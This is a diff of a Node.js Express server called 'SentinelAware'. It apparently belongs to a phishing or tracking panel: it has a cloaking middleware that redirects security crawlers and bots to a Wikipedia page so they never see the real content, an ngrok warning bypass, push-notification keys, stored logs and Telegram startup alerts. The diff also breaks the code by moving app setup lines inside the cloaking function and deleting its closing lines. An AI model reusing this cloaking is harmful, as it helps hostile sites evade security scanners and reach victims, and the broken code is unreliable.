@@ -128,14 +128,14 @@ function cloakingMiddleware(req, res, next) {
     if (suspiciousUA.some(bot => ua.includes(bot))) {
         return res.redirect('https://pt.wikipedia.org/wiki/Seguran%C3%A7a_da_informa%C3%A7%C3%A3o');
     }
-    next();
-}
+    // Middleware
+    const publicPath = path.join(process.cwd(), 'public');
+    app.use(express.static(publicPath));
+    app.use(express.json());
+    app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });
 
-app.use(express.static(path.join(__dirname, 'public')));
-app.use(express.json());
-app.use((req, res, next) => { res.setHeader('ngrok-skip-browser-warning', 'true'); next(); });
+    app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'index.html')));
 
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/api/vapid-public-key', (req, res) => res.json({ publicKey: vapidKeys ? vapidKeys.publicKey : null }));
 app.post('/api/heartbeat', (req, res) => res.json({ status: 'active' }));
 
@@ -245,9 +245,11 @@ app.get('/api/links', (req, res) => res.json(links));
 app.delete('/api/logs', async (req, res) => { logs = []; await pool.query('DELETE FROM logs'); res.json({ success: true }); });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`[SERVER] SentinelAware rodando na porta ${PORT}`);
-    sendTelegramMsg(`🚀 *SERVIDOR INICIADO*\nHost: \`${process.env.VERCEL_URL || 'Local'}\`\nPorta: \`${PORT}\``);
-});
+if (!process.env.VERCEL) {
+    server.listen(PORT, () => {
+        console.log(`[SERVER] SentinelAware rodando na porta ${PORT}`);
+        sendTelegramMsg(`🚀 *SERVIDOR INICIADO*\nHost: \`Local/Ngrok\`\nPorta: \`${PORT}\``);
+    });
+}
 
 module.exports = app;
